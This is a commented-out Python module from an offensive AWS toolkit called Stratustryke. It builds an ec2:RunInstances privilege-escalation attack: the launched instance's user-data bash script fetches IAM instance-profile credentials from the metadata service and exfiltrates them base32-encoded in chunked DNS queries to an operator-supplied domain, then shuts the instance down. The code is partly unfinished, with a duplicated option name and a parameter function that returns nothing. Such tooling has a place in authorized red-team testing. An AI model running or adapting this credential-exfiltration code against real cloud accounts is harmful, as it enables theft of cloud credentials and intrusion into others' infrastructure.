
# from textwrap import dedent
# from uuid import uuid4

# from stratustryke.core.module.aws import AWSModule


# class Module(AWSModule):
    
#     OPT_EXFIL_TYPE = 'EXFIL_TYPE'
#     OPT_TARGET_ROLE = 'TARGET_ROLE'
#     OPT_EXFIL_TARGET = 'EXFIL_TARGET'

#     OPT_INSTANCE_TYPE = 'INSTANCE_TYPE'
#     OPT_AMI_ID = 'INSTANCE_AMI'
#     OPT_SUBNET_ID = 'SUBNET_ID'
#     OPT_SEC_GROUP_ID = 'SEC_GROUP_ID'


#     def __init__(self, framework):
#         super().__init__(framework)
#         self._info = {
#             'Authors': ['@vexance'],
#             'Description': 'Launch an instnace with user data to retrieve creds',
#             'Details': 'Performs ec2:RunInstances while passing in a user data script to exiltrate IAM profile credentials',
#             'References': ['']
#         }

#         self._options.add_string(Module.OPT_EXFIL_TARGET, 'IAM profile arn/name for the instance', True)
#         self._options.add_string(Module.OPT_EXFIL_TYPE, 'Mechanism to exfiltrate data (HTTP,DNS,Logs)', True, 'DNS')
#         self._options.add_string(Module.OPT_EXFIL_TARGET, 'Domain or HTTP/S URI to perform exfiltration to', False)

#         self._advanced.add_string(Module.OPT_INSTANCE_TYPE, 'Ec2 instance type to use', False, 't4g.nano')
#         self._advanced.add_string(Module.OPT_AMI_ID, 'AMI identifier for launched instance', False, 'ami-0e723566181f273cd')
#         self._advanced.add_string(Module.OPT_SUBNET_ID, 'Speciifc subnet to launch the instance in', False)
#         self._advanced.add_string(Module.OPT_SEC_GROUP_ID, 'Specific security group to launch the instance with', False)


#     @property
#     def search_name(self):
#         return f'aws/ec2/privesc/{self.name}'
    

#     def get_launch_parameters(self) -> dict:

#         arn_here = ''
#         name_here = ''

#         params = {
#             'ImageId': self.get_opt(Module.OPT_AMI_ID),
#             'InstanceType': self.get_opt(Module.OPT_INSTANCE_TYPE),
#             'UserData': self.build_user_data_script(),
#             'MinCount': 1,
#             'MaxCount': 1,
#             'InstanceInitiatedShutdownBehavior': 'terminate',
#             'IamInstanceProfile': {
#                 'Arn': arn_here,
#                 'Name': name_here
#             }
#         }

#         subnet = self.get_opt(Module.OPT_SUBNET_ID)
#         if subnet: params['SubnetId'] = subnet

#         sg_id = self.get_opt(Module.OPT_SEC_GROUP_ID)
#         if sg_id: params['SecurityGroupIds'] = [sg_id]

    
#     def build_user_data_script(self) -> str:
#         '''Generate a user data script with three options to exfiltrate data'''

#         EXFIL_ENDPOINT = self.get_opt(Module.OPT_EXFIL_TARGET)
#         dns_exil_id = str(uuid4())[0:8]
#         self.print_status(f'Using {dns_exil_id}.{EXFIL_ENDPOINT} for data exfiltration...')
#         # if not (EXFIL_ENDPOINT.startswith('https://') or EXFIL_ENDPOINT.startswith('http://')):
#         #     EXFIL_ENDPOINT = f'https://{EXFIL_ENDPOINT}'
#         #     self.print_warning(f'Interpreted HTTP/S exiltration endpoint as {EXFIL_ENDPOINT}')
#         # else:
#         #     self.print_status(f'Preparing user data for HTTP/S exfiltration to {EXFIL_ENDPOINT}')
        
#         user_data_http = dedent(f'''\
#         #!/bin/bash

#         # Stratustryke IAM instance profile credential exfiltrator
#         # https://github.com/vexance/Stratustryke

#         set -u

#         IMDS_ENDPOINT="http://169.254.169.254";
#         IMDS_TOKEN=$(curl -fsS --max-time 2 -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT "$IMDS_ENDPOINT/latest/api/token");
#         IAM_PROFILE=$(curl -fsS --max-time 2 -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "$IMDS_ENDPOINT/latest/meta-data/iam/security-credentials/" );
#         CREDENTIALS=$(curl -fsS --max-time 2 -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "$IMDS_ENDPOINT/latest/meta-data/iam/security-credentials/$IAM_PROFILE" );

#         # Exfiltrate to remote system
#         BASE32=$(echo $CREDENTIALS | base32 --wrap=0 | tr -d '=');                                
#         EXFIL_LENGTH=${{#BASE32}};
#         for ((i=0; i<EXFIL_LENGTH; i+=63)); do
#             CHUNK_FQDN="${{BASE32:i:63}}.{dns_exil_id}.{EXFIL_ENDPOINT}";
#             host -t A "$CHUNK_FQDN";
#             sleep 1;
#         done
#         host -t A "stratustryke-complete.{dns_exil_id}.{EXFIL_ENDPOINT}";

#         echo "Completed credentails exfiltration attempt; shutting down..."
#         shutdown -h now
#         exit 0
#         ''')
